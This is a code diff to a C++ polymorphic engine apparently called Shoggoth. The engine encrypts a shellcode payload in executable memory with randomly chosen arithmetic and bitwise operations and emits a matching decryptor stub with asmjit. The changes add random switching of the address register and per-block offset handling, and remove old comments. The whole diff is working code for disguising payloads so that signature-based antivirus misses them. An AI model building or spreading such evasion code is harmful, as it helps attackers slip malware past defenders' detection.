@@ -9,7 +9,6 @@ PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, 
         this->numberOfBlocks++;
     }
     newPayloadSize = this->numberOfBlocks * BLOCK_SIZE;
-    //encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newPayloadSize);
     encryptedArea = (PBYTE)VirtualAlloc(NULL, newPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     memcpy(encryptedArea, plainPayload, payloadSize);
     // Put nop sled
@@ -17,20 +16,24 @@ PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, 
     memset(encryptedArea + payloadSize, 0x90, (payloadSize % BLOCK_SIZE ? BLOCK_SIZE - payloadSize % BLOCK_SIZE : 0));
     blockCursor = (uint64_t*)encryptedArea;
     this->addressHolderForSecondEncryption = this->GetRandomGeneralPurposeRegister();
+    this->firstAddressHolderForSecondEncryption = this->addressHolderForSecondEncryption;
     this->encryptListForBlocks = (ENCRYPT_TYPE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ENCRYPT_TYPE) * this->numberOfBlocks);
     for (int i = 0; i < this->numberOfBlocks; i++) {
+        if (RandomizeInRange(1, 6) == 3) {
+            this->ChangeAddressHolder(&(this->encryptListForBlocks[i]));
+        }
+        else {
+            this->encryptListForBlocks[i].changeSourceRegister = false;
+        }
         this->GetRandomSecondEncryption(&(this->encryptListForBlocks[i]));
         this->ApplyRandomSecondEncryption(blockCursor, &(this->encryptListForBlocks[i]));
         blockCursor++;
     }
-    //VirtualFree(plainPayload, 0, MEM_RELEASE);
     return encryptedArea;
 }
 
 PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload, int payloadSize, int& secondDecryptorBlockSize) {
     // Garbage + callto pop + garbage + payload + pop + garbage + decipherstep
-    // Ya constantla olsun ya da registera atanan bir deger ile
-    // Ayrica pop her ne kadar garbage'i gosterse bile, payload offsetini ayri degiskende tutuyor
     int callStubSize = 0;
     int firstGarbageSize = 0;
     int popStubSize = 0;
@@ -38,10 +41,8 @@ PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload, int payloadSiz
     int decryptorStubSize = 0;
     PBYTE returnPtr = NULL;
     PBYTE callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
-    //PBYTE firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
-    // Mov + rsp stub da eklenecek
     PBYTE popStub = this->GetPopInstructionAfterPayload(popStubSize);
-    //PBYTE secondGarbage = this->GenerateRandomGarbage(secondGarbageSize);
+    // TODO add garbage if it is required
     PBYTE decryptorStub = this->GenerateSecondDecryptorStub(decryptorStubSize, secondGarbageSize);
 
     returnPtr = (PBYTE)VirtualAlloc(NULL, callStubSize + payloadSize + popStubSize + decryptorStubSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -56,95 +57,104 @@ PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload, int payloadSiz
     this->asmjitRuntime.release(callStub);
     this->asmjitRuntime.release(popStub);
     this->asmjitRuntime.release(decryptorStub);
-    // VirtualFree(callStub, 0, MEM_RELEASE);
-    // VirtualFree(popStub, 0, MEM_RELEASE);
-    // VirtualFree(decryptorStub, 0, MEM_RELEASE);
     return returnPtr;
 }
 
 
 PBYTE ShoggothPolyEngine::GenerateSecondDecryptorStub(int& decryptorStubSize, int offsetToEncryptedPayload) {
-    for (int i = 0; i < this->numberOfBlocks; i++) {
-        // QWORDUN yanina offset konulabiliyomus
-        // Aaaa schemanin arasina da garbage koyabiliyoz
-        // Bu decoder stubi popdan sonraya gelecek
-        // ptr olanlari add olanlarla da degistir
+    int currentBlockOffset = 0;
+    this->addressHolderForSecondEncryption = this->firstAddressHolderForSecondEncryption;
+    for (int i = 0; i < this->numberOfBlocks; i++,currentBlockOffset++) {
+        if (this->encryptListForBlocks[i].changeSourceRegister) {
+            if (RandomizeBool()) {
+                asmjitAssembler->mov(this->encryptListForBlocks[i].newSourceRegister, this->encryptListForBlocks[i].oldSourceRegister);
+               
+            }
+            else {
+                asmjitAssembler->push(this->encryptListForBlocks[i].oldSourceRegister);
+                asmjitAssembler->pop(this->encryptListForBlocks[i].newSourceRegister);
+            }
+            asmjitAssembler->add(this->encryptListForBlocks[i].newSourceRegister, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE));
+            this->addressHolderForSecondEncryption = this->encryptListForBlocks[i].newSourceRegister;
+            currentBlockOffset = 0;
+        }
         switch (this->encryptListForBlocks[i].operation) {
         case ADD_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
                 asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
-                asmjitAssembler->sub(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->sub(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->sub(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
+                asmjitAssembler->sub(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
             }
             break;
         case SUB_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
                 asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
-                asmjitAssembler->add(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->add(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->add(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
+                asmjitAssembler->add(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
             }
             break;
         case XOR_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
                 asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
-                asmjitAssembler->xor_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->xor_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->xor_(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
+                asmjitAssembler->xor_(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
             }
             break;
         case NOT_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
-                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                 asmjitAssembler->not_(this->encryptListForBlocks[i].operandRegister);
-                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->not_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->not_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
             }
             break;
         case NEG_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
-                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                 asmjitAssembler->neg(this->encryptListForBlocks[i].operandRegister);
-                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->neg(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->neg(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
             }
             break;
         case INC_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
-                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                 asmjitAssembler->dec(this->encryptListForBlocks[i].operandRegister);
-                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->dec(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->dec(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
             }
             break;
         case DEC_OPERATION_FOR_CRYPT:
             if (this->encryptListForBlocks[i].isRegister) {
-                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                 asmjitAssembler->inc(this->encryptListForBlocks[i].operandRegister);
-                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
+                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
             }
             else {
-                asmjitAssembler->inc(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
+                asmjitAssembler->inc(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
             }
             break;
-        case ROL_OPERATION_FOR_CRYPT: // TODO: Register case
-            asmjitAssembler->ror(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
+        case ROL_OPERATION_FOR_CRYPT: 
+            asmjitAssembler->ror(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
             break;
         case ROR_OPERATION_FOR_CRYPT:
-            asmjitAssembler->rol(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
+            asmjitAssembler->rol(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
             break;
         }
     }
+    asmjitAssembler->sub(this->addressHolderForSecondEncryption, (this->numberOfBlocks - currentBlockOffset) * BLOCK_SIZE);
     if (RandomizeBool()) {
         asmjitAssembler->jmp(this->addressHolderForSecondEncryption);
     }
@@ -250,4 +260,15 @@ void ShoggothPolyEngine::ApplyRandomSecondEncryption(uint64_t* blockCursor, ENCR
         *blockCursor = _rotr64(*blockCursor, encryptTypeHolder->operandValue);
         break;
     }
+}
+
+void ShoggothPolyEngine::ChangeAddressHolder(ENCRYPT_TYPE* encryptTypeHolder) {
+    encryptTypeHolder->changeSourceRegister = true;
+    encryptTypeHolder->oldSourceRegister = this->addressHolderForSecondEncryption;
+    x86::Gp tempRegister = GetRandomGeneralPurposeRegister();
+    while (this->addressHolderForSecondEncryption.id() == tempRegister.id()) {
+        tempRegister = this->GetRandomGeneralPurposeRegister();
+    }
+    encryptTypeHolder->newSourceRegister = tempRegister;
+    this->addressHolderForSecondEncryption = tempRegister;
 }
